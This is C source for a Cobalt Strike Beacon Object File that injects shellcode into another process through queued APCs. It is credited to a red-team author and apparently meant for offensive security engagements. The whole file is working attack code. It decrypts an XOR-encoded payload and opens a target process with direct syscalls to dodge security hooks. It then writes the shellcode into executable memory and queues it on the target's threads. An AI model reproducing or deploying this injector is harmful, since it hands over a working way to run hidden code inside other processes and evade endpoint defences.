////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      QUEUEUSERAPC BOF                                                                                              //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o QueueUserAPC.o -c QueueUserAPC.c -masm=intel                                             //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include "beacon.h"
#include "helpers.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Thread32First(HANDLE, LPTHREADENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Thread32Next(HANDLE, LPTHREADENTRY32);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen)
{
    if(8 != sizeof(void*))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    SIZE_T allocation_size;
    int payload_size ;
    datap parser;

    BeaconDataParse(&parser, args, alen);

    DWORD pid = BeaconDataInt(&parser);
    char* shellcode = BeaconDataExtract(&parser, &payload_size);
    int threads = BeaconDataInt(&parser);

    if(payload_size == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Payload too small: %d", payload_size);
        return;
    }
    else
    {
        allocation_size = payload_size + 1;
    }

    shellcode = xordecrypt(shellcode, payload_size);

    /*==================================*/
    /*              GET PID             */
    /*==================================*/

    HANDLE hProcess, hThread;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
    CLIENT_ID cID;
    cID.UniqueThread = 0;
    cID.UniqueProcess = ULongToHandle(pid);

    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

    if(hProcess == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid handle: %ld", pid);
        goto lblCleanup;
    }

    /*==================================*/
    /*             INJECTING            */
    /*==================================*/

    NTSTATUS status;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocating");
    LPVOID allocation_start = NULL;

    status = NtAllocateVirtualMemory(hProcess, &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory: %x", status);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing");
    status = NtWriteVirtualMemory(hProcess, allocation_start, shellcode, allocation_size, 0);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not write memory: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Changing protections");
    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &allocation_start, &allocation_size, PAGE_EXECUTE_READ, &oldProtect);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not change protections to EXECUTE_READ: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    /*==================================*/
    /*             QUEUE APC            */
    /*==================================*/

    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 threadEntry = {sizeof(THREADENTRY32)};
    if(KERNEL32$Thread32First(snapshot, &threadEntry))
    {
        int count = 0;
        while(KERNEL32$Thread32Next(snapshot, &threadEntry))
        {
            if(count > threads)
            {
                break;
            }
            if(threadEntry.th32OwnerProcessID == pid)
            {
                count++;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Assigning APC to thread: %ld", threadEntry.th32ThreadID);
                OBJECT_ATTRIBUTES tOa;
                InitializeObjectAttributes(&tOa, 0, 0, 0, 0);

                CLIENT_ID tcID;
                tcID.UniqueProcess = UlongToHandle(pid);
                tcID.UniqueThread = UlongToHandle(threadEntry.th32ThreadID);

                NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tOa, &tcID);
                NtSuspendThread(hThread, NULL);
                NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)allocation_start, allocation_start, NULL, NULL);
                NtResumeThread(hThread, NULL);
            }
        }
    }

    NtClose(snapshot);
    snapshot = NULL;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");

lblCleanup:
    NtClose(hThread);
    NtClose(hProcess);
    hThread = NULL;
    hProcess = NULL;
    return;
}